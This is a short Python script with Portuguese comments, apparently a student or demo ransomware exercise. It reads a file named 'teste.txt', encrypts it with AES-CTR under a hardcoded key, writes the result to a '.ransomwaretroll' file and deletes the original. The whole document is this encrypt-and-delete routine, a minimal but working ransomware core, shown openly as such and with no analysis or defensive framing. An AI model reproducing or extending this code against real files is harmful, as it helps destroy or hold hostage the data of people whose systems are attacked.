import os
import pyaes

# abrir o arquivo a ser criptografado
file_name = "teste.txt"
key = b"testeransomwares"

# criar um novo arquivo para escrever os dados criptografados
with open(file_name, "rb") as file:
    with open(f"{file_name}.ransomwaretroll", "wb") as new_file:
        aes = pyaes.AESModeOfOperationCTR(key)
        while True:
            # ler o arquivo em blocos de 1024 bytes
            data = file.read(1024)
            if not data:
                break
            # criptografar o bloco de dados
            crypto_data = aes.encrypt(data)
            # escrever o bloco criptografado no novo arquivo
            new_file.write(crypto_data)

# remover o arquivo original
os.remove(file_name)